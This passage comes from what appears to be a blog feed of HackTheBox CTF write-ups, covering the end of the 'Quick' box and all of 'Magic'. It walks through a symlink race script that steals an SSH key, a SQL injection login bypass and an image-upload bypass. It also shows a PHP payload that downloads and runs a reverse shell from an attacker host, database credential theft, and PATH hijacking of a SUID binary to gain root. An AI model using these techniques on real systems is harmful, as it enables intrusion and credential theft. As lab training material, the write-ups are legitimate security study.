potentially exploit this race condition to read any files owned by <code>srvadm</code>. The first that comes to mind is <code>srvadm</code> SSH key.</p><p>One way we could exploit the race condition to read <code>srvadm</code> SSH key is to replace the file to be printed by a symlink to <code>/home/srvadm/.ssh/id_rsa</code> just before it gets read and send to our <code>nc</code> listener.</p><p>Let’s make a quick script to achieve this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/<span class="built_in">jobs</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> $(ls .);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        rm <span class="variable">$file</span>;</span><br><span class="line">        ln -s /home/srvadm/.ssh/id_rsa <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>The script monitor the <code>/var/www/jobs</code> directory and for each new file created, this one will be deleted and replaced by a symlink to <code>srvadm</code> SSH key. </p><p>This way when the printer app arrive to this statement : <code>$printer -&gt; text(file_get_contents(&quot;/var/www/jobs/&quot;.$file));</code>, it will read the SSH key and send it to our listener.</p><p>Let’s give it a try!</p><p>First we open our <code>nc</code> listener (our fake printer):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>Then we launch our script on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/$ bash /tmp/.hg8/race.sh</span><br></pre></td></tr></table></figure><p>And finally we create a random new job on the printer app interface:</p><p><img src="https://user-images.githubusercontent.com/9076747/81426943-3b86de00-915a-11ea-9ec4-9953d2c9b50f.png" alt="quick printer test print"></p><p>If everything goes fine our listener receive the SSH key:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.186:54026</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P</span><br><span class="line">[...]</span><br><span class="line">NJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">VATotal received bytes: 1685</span><br><span class="line">Total sent bytes: 0</span><br></pre></td></tr></table></figure><p>We can now use this key to connect to <code>srvadm</code> account:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa_srvadm srvadm@quick.htb</span><br><span class="line">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)</span><br><span class="line"></span><br><span class="line">Last login: Fri Mar 20 05:56:02 2020 from 172.16.118.129</span><br><span class="line">srvadm@quick:~$ ls</span><br><span class="line">srvadm@quick:~$</span><br></pre></td></tr></table></figure><h3 id="Cached-configuration"><a href="#Cached-configuration" class="headerlink" title="Cached configuration"></a>Cached configuration</h3><p>At first glance <code>srvadm</code> doesn’t hold any valuable informations nor tools. No SUID binary, no sudo entries, no misconfiguration… Then what ? </p><p>Let’s manually review its home folder.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">srvadm@quick:~$ ls -la</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x 6 srvadm srvadm 4096 Mar 20 06:37 .</span><br><span class="line">drwxr-xr-x 4 root   root   4096 Mar 20 02:16 ..</span><br><span class="line">lrwxrwxrwx 1 srvadm srvadm    9 Mar 20 02:38 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 srvadm srvadm  220 Mar 20 02:16 .bash_logout</span><br><span class="line">-rw-r--r-- 1 srvadm srvadm 3771 Mar 20 02:16 .bashrc</span><br><span class="line">drwx------ 5 srvadm srvadm 4096 Mar 20 06:20 .cache</span><br><span class="line">drwx------ 3 srvadm srvadm 4096 Mar 20 02:38 .gnupg</span><br><span class="line">drwxrwxr-x 3 srvadm srvadm 4096 Mar 20 06:37 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r-- 1 srvadm srvadm  807 Mar 20 02:16 .profile</span><br><span class="line">drwx------ 2 srvadm srvadm 4096 Mar 20 02:38 .ssh</span><br></pre></td></tr></table></figure><p>The <code>.cache/</code> folder might hold valuable cached informations. While looking around in the cached configuration file we find something interesting: another file in relation with printers in <code>~/.cache/conf.d/printers.conf</code>.</p><p>Inside we find a odd string:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">srvadm@quick:~$ cat .cache/conf.d/printers.conf</span><br><span class="line"><span class="comment"># Printer configuration file for CUPS v2.3.0</span></span><br><span class="line">[...]</span><br><span class="line">DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer</span><br></pre></td></tr></table></figure><p>URLDecoding it returns:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://srvadm@quick.htb:&amp;ftQ4K3SGde8?@printerv3.quick.htb/printer</span><br></pre></td></tr></table></figure><p>Could <code>&amp;ftQ4K3SGde8?</code> be the <code>root</code> account password?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh root@quick.htb</span><br><span class="line">root@quick.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Mon Apr 20 08:01:18 2020</span></span><br><span class="line"><span class="string">root@quick:~# ls</span></span><br><span class="line"><span class="string">docker-compose.yml  fullchain.pem  nginx.conf  portal  privkey.pem  root.txt</span></span><br><span class="line"><span class="string">root@quick:~# cat root.txt</span></span><br><span class="line"><span class="string">7xxxxxxxxxxxxxxxxxxxxxxxxxx7</span></span><br></pre></td></tr></table></figure><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Hard Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> quick </tag>
            
            <tag> http3 </tag>
            
            <tag> esigate </tag>
            
            <tag> ESI injection </tag>
            
            <tag> custom exploitation </tag>
            
            <tag> CUPS </tag>
            
            <tag> printer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Magic</title>
      <link href="/posts/magic/"/>
      <url>/posts/magic/</url>
      
        <content type="html"><![CDATA[<img width="587" alt="magic-hackthebox" src="https://user-images.githubusercontent.com/9076747/82157773-c1560800-9883-11ea-8e96-c3c17d69a254.png"><p>Magic just retired on HackTheBox. It is a Medium difficulty Linux box that required a lot enumeration in order to not miss any crucial information. While rated Medium I would advise this box for beginner trying to make the jump from Easy boxes since there is not a lot of rabbit hole and both user and root flag are quite logical and straightforward to get. </p><p><strong>Tl;Dr:</strong> The user flag is accessible after multiple steps. First you have to bypass a restricted file upload form to upload and run a Web-Shell as <code>www-data</code> user. With this access you can find MySQL credentials in a configuration file. Dumping the database allows you get <code>theseus</code> password and access his user account where the fag is.<br>The root flag was accessible by abusing a custom binary that could be run as <code>root</code> with <code>sudo</code> without password by editing the <code>$PATH</code> variable to make the binary run your custom commands. </p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.185 magic.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC magic.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> magic.htb (10.10.10.185)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Magic Portfolio</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>We have a classical web app running on port 80 and the SSH port 22 open.</p><p>Opening <code>http://magic.htb</code> display a following page:</p><p><img src="https://user-images.githubusercontent.com/9076747/80870233-6f1ebf80-8ca5-11ea-8506-524384c3fea4.png" alt="magic homepage"></p><p>At first look, it seems like a classical image gallery website. It doesn’t seem we can access anything without login in. </p><p>Out of curiosity I tried a few common SQL injection on the login form and surprisingly the infamous <code>&#39; or 1--</code> worked. Once again this is a good reminder to never skip the basics…</p><p>Logging in with <code>&#39; or 1--</code> as username and password brings us to the following upload form:</p><p><img src="https://user-images.githubusercontent.com/9076747/80872891-2c64e380-8cb5-11ea-8a9b-d85d5dced477.png" alt="magic upload form"></p><p>As usual with Upload form the best way to go is to upload a Web-Shell to gain Remote Code execution on the back-end. We knows the server run PHP so let’s try to upload a simple php file containing <code>&lt;?php phpinfo();</code>. </p><p>With no surprises the server returns the following message:</p><blockquote><p>Sorry, only JPG, JPEG &amp; PNG files are allowed.</p></blockquote><p>From here we can try few of the most common file upload restriction bypass:</p><ul><li>Changing extension (<code>test.PHp</code>, <code>test.php5</code>)</li><li>Content-type bypass</li><li>Double extension (<code>test.php.jpg</code>, <code>test.jpg.php</code>)</li><li>Null Character (<code>test.php%00.jpg</code>)</li><li>Using GIF89a; header</li></ul><h3 id="Abusing-Double-Extension"><a href="#Abusing-Double-Extension" class="headerlink" title="Abusing Double Extension"></a>Abusing Double Extension</h3><p>The only method that worked is the double extension attack. As a reminder here is the issue with double extension on some Apache configuration:</p><blockquote><p>Files can have more than one extension; the order of the extensions is normally irrelevant. For example, if the file welcome.html.fr maps onto content type text/html and language French then the file welcome.fr.html will map onto exactly the same information. </p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_mime.html#multipleext">Apache Documentation - Files with Multiple Extensions</a></p></blockquote><p>Therefore if you have a file in the following format : <code>hg8.php.123</code> it may be interpreted as a PHP file by Apache Server (depending on the configuration). </p><p>In our case if the server is validating the file extension and the mime-type it should be possible to upload a image file appended with php code and with the following extension <code>.php.jpg</code>  . This files will pass all the upload form checks but will be able interpreted as PHP by Apache.</p><p>To clarify the idea, let’s see in practice.</p><ol><li>Let’s download a very small (but valid) JPEG image. I will use one from this <a href="https://github.com/mathiasbynens/small">repository</a>:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://raw.githubusercontent.com/mathiasbynens/small/master/jpeg.jpg</span><br><span class="line">[hg8@archbook ~]$ cp jpeg.jpg hg8.php.jpg</span><br></pre></td></tr></table></figure><ol start="2"><li>Append PHP code to the image with a simple <code>echo</code>:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;&lt;?php phpinfo();&quot;</span> &gt;&gt; hg8.php.jpg</span><br><span class="line">[hg8@archbook ~]$ cat hg8.php.jpg</span><br><span class="line">C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">? &lt;?php phpinfo();</span><br></pre></td></tr></table></figure><ol start="3"><li>Upload the file to the server.</li></ol><p>Once uploaded we get the following success message:</p><blockquote><p>The file hg8.php.jpg has been uploaded.</p></blockquote><p>Following the pattern of other images displayed on the homepage, we can guess that our file path is available at <code>http://magic.htb/images/uploads/hg8.php.jpg</code>. Let’s open it:</p><p><img src="https://user-images.githubusercontent.com/9076747/80873448-e90c7400-8cb8-11ea-8203-610de9125ed7.png" alt="magic double extension upload"></p><p>Bingo, we got php to execute on the server. </p><h3 id="Upload-and-launch-of-Reverse-Shell"><a href="#Upload-and-launch-of-Reverse-Shell" class="headerlink" title="Upload and launch of Reverse Shell"></a>Upload and launch of Reverse Shell</h3><p>Let’s do the same to upload a reverse shell on the server using php. Here is one way to do so:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> exec(<span class="string">&quot;wget 10.10.14.7:8000/hg8.py -O /tmp/hg8.py&quot;</span>); </span><br><span class="line">exec(<span class="string">&quot;python3 /tmp/hg8.py&quot;</span>);</span><br></pre></td></tr></table></figure><p>Let’s open our listener: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>Then after upload and opening our php/image file a new connection appear:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.185:46348</span><br><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>We have a shell as <code>www-data</code>, that’s a good start. First let’s upgrade our shell to get a fully interactive one and ease our work:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$ python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@ubuntu:/$</span><br><span class="line">&lt;Ctrl+Z&gt;</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ stty size</span><br><span class="line">54 100</span><br><span class="line">[hg8@archbook ~]$ stty raw -<span class="built_in">echo</span></span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line">www-data@ubuntu:/$ reset</span><br><span class="line">www-data@ubuntu:/$ <span class="built_in">export</span> SHELL=bash</span><br><span class="line">www-data@ubuntu:/$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">www-data@ubuntu:/$ stty rows 54 columns 100</span><br></pre></td></tr></table></figure><p>Alright! We can now do a bit of recon for interesting files. Like in most of web app we can often find credentials in a <code>config.php</code> or <code>database.php</code> file. This one followed the rule:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/$ cat /var/www/Magic/db.php5</span><br><span class="line">&lt;?php</span><br><span class="line">class Database</span><br><span class="line">&#123;</span><br><span class="line">    private static <span class="variable">$dbName</span> = <span class="string">&#x27;Magic&#x27;</span> ;</span><br><span class="line">    private static <span class="variable">$dbHost</span> = <span class="string">&#x27;localhost&#x27;</span> ;</span><br><span class="line">    private static <span class="variable">$dbUsername</span> = <span class="string">&#x27;theseus&#x27;</span>;</span><br><span class="line">    private static <span class="variable">$dbUserPassword</span> = <span class="string">&#x27;iamkingtheseus&#x27;</span>;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><h3 id="Pivot-www-data-gt-theseus"><a href="#Pivot-www-data-gt-theseus" class="headerlink" title="Pivot www-data -&gt; theseus"></a>Pivot www-data -&gt; theseus</h3><p>Good, we got the MySQL database credentials. Let’s connect to the database to see if we can find valuable informations and maybe other user accounts details:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/$ mysql -u theseus -p</span><br><span class="line">Command <span class="string">&#x27;mysql&#x27;</span> not found.</span><br><span class="line">www-data@ubuntu:/$</span><br></pre></td></tr></table></figure><p>Well that sucks. Maybe another binary can help us access the database ? </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/$ find /usr/bin -name <span class="string">&quot;*sql*&quot;</span></span><br><span class="line">find /usr/bin -name <span class="string">&quot;*sql*&quot;</span></span><br><span class="line">/usr/bin/mysqloptimize</span><br><span class="line">/usr/bin/mysqldump</span><br><span class="line">/usr/bin/mysqladmin</span><br><span class="line">/usr/bin/mysqlshow</span><br><span class="line">/usr/bin/mysqld_safe</span><br><span class="line">/usr/bin/mysqlbinlog</span><br><span class="line">/usr/bin/mysqldumpslow</span><br><span class="line">/usr/bin/mysqlcheck</span><br><span class="line">/usr/bin/mysql_ssl_rsa_setup</span><br><span class="line">/usr/bin/mysqlimport</span><br><span class="line">/usr/bin/mysql_tzinfo_to_sql</span><br><span class="line">/usr/bin/mysql_upgrade</span><br><span class="line">/usr/bin/mysqlslap</span><br><span class="line">/usr/bin/mysql_secure_installation</span><br><span class="line">/usr/bin/mysqlrepair</span><br><span class="line">/usr/bin/mysqlanalyze</span><br><span class="line">/usr/bin/mysql_config_editor</span><br><span class="line">/usr/bin/mysqld_multi</span><br><span class="line">/usr/bin/mysql_plugin</span><br><span class="line">/usr/bin/mysql_embedded</span><br><span class="line">/usr/bin/mysql_install_db</span><br><span class="line">/usr/bin/mysqlpump</span><br><span class="line">/usr/bin/mysqlreport</span><br></pre></td></tr></table></figure><p>That should be more than enough. Let’s use <code>mysqldump</code> to dump the whole database so we can take a look at it offline:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/$ mkdir /tmp/.hg8/</span><br><span class="line">www-data@ubuntu:/$ mysqldump -u theseus -p Magic &gt; /tmp/.hg8/base.sql</span><br><span class="line">Enter password:</span><br><span class="line">www-data@ubuntu:/$ cat /tmp/.hg8/base.sql</span><br><span class="line">-- MySQL dump 10.13  Distrib 5.7.29, <span class="keyword">for</span> Linux (x86_64)</span><br><span class="line">[...]</span><br><span class="line">INSERT INTO `login` VALUES (1,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;Th3s3usW4sK1ng&#x27;</span>);</span><br></pre></td></tr></table></figure><p>Can this be the credentials of <code>theseus</code> user ? Since it’s the only user on the box ? Let’s give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/$ su - theseus</span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line">theseus@ubuntu:~$ ls</span><br><span class="line">ls</span><br><span class="line">Desktop    Downloads  Pictures  Templates  Videos</span><br><span class="line">Documents  Music      Public    user.txt</span><br><span class="line">theseus@ubuntu:~$ cat user.txt</span><br><span class="line">0xxxxxxxxxxxxxxxxxxxxxxxxxa</span><br></pre></td></tr></table></figure><p>To ease our future progress with a more confortable shell let’s add our SSH key to <code>theseus</code> user <code>authorized_keys</code> file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">theseus@ubuntu:~$ <span class="built_in">echo</span> <span class="string">&quot;ssh-rsa Axxxxxxxx hg8@htb.htb&quot;</span> &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line">theseus@ubuntu:~$ <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa_htb theseus@magic.htb</span><br><span class="line">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-42-generic x86_64)</span><br><span class="line">theseus@ubuntu:~$</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>While doing our classical recon for privilege escalation, a uncommon SUID binary pop out of our search:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">theseus@ubuntu:~$ find /bin -perm -4000</span><br><span class="line">/bin/sysinfo</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>As it’s name indicate, running the binary displays system information:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">theseus@ubuntu:~$ /bin/sysinfo</span><br><span class="line">====================Hardware Info====================</span><br><span class="line">H/W path           Device      Class      Description</span><br><span class="line">=====================================================</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>Since this binary looks like homemade and running as <code>root</code> let’s dig a bit since it’s probably our way to privilege escalation.</p><p>When running an unknown binary it’s always interesting to open it with <code>ltrace</code> to understand better what’s going on behind the hood. While doing so we can notice something valuable:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">theseus@ubuntu:~$ ltrace  /bin/sysinfo 2&gt;&amp;1 | grep popen</span><br><span class="line">popen(<span class="string">&quot;lshw -short&quot;</span>, <span class="string">&quot;r&quot;</span>)                        = 0x5617225b8e80</span><br><span class="line">popen(<span class="string">&quot;fdisk -l&quot;</span>, <span class="string">&quot;r&quot;</span>)                           = 0x5617225b8e80</span><br><span class="line">popen(<span class="string">&quot;cat /proc/cpuinfo&quot;</span>, <span class="string">&quot;r&quot;</span>)                  = 0x5617225b8e80</span><br><span class="line">popen(<span class="string">&quot;free -h&quot;</span>, <span class="string">&quot;r&quot;</span>)                            = 0x5617225b8e80</span><br></pre></td></tr></table></figure><p>The binary is actually running various other binaries to get the needed informations. But something dangerous is happening here. The binary path is only relative instead of being absolute like : <code>/usr/bin/lshw</code>.</p><p>In Linux, when you type a command, like for example <code>cat</code> the system will look at the current user defined <code>$PATH</code> variable to know in which directory to search for the <code>cat</code> binary. By default, the <code>$PATH</code> variable contains the following locations:</p><ul><li>/usr/bin</li><li>/usr/sbin</li><li>/usr/local/bin</li><li>/usr/local/sbin</li><li>/bin</li><li>/sbin</li></ul><p>If the system find the binary <code>cat</code> in the first folder it stop the search and run the binary. </p><p>Since we have control over the current user $PATH variable, it’s should be possible to edit the list to something like so:</p><ul><li>/tmp/.hg8/</li><li>/usr/bin</li><li>/usr/sbin</li><li>/usr/local/bin</li><li>/usr/local/sbin</li><li>/bin</li><li>/sbin</li></ul><p>That mean if we put a rogue <code>cat</code> binary in <code>/tmp/.hg8/</code> , it’s this rogue binary that will get executed first whenever we type <code>cat</code>. See the issue now?</p><p>Let’s use this knowledge to exploit the <code>sysinfo</code> SUID binary.</p><p>First, let’s add our “rogue” directory to the current <code>$PATH</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">theseus@ubuntu:~$ PATH=/tmp/.hg8/:<span class="variable">$PATH</span></span><br><span class="line">theseus@ubuntu:~$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/tmp/.hg8/:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/<span class="built_in">local</span>/games:/snap/bin</span><br></pre></td></tr></table></figure><p>Now, since we know that <code>/bin/sysinfo</code> is running <code>fdisk</code>, let’s create a fake <code>fdisk</code> file with our malicious content inside. For example we can append our SSH key to the <code>root</code> user <code>authorized_keys</code> file.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">theseus@ubuntu:~$ cat /tmp/.hg8/fdisk</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">mkdir -p /root/.ssh/</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAxxxxxxxx hg8@htb.htb&quot;</span> &gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Done -hg8&quot;</span></span><br></pre></td></tr></table></figure><p>Now <code>sysinfo</code> should pick our fake <code>fdisk</code> and since <code>sysinfo</code> have SUID set our <code>fdisk</code> should be run as <code>root</code>. Let’s verify this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">theseus@ubuntu:~$ /bin/sysinfo</span><br><span class="line">[...]</span><br><span class="line">Done -hg8</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>Looks like everything went fine, we should now be able to login as <code>root</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa_htb root@magic.htb</span><br><span class="line">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-42-generic x86_64)</span><br><span class="line"></span><br><span class="line">root@ubuntu:~<span class="comment"># cat root.txt</span></span><br><span class="line">fxxxxxxxxxxxxxxxxxxxxxxxxxe</span><br></pre></td></tr></table></figure><hr><p>That’s it folks! As always do not hesitate to contact me for any questions 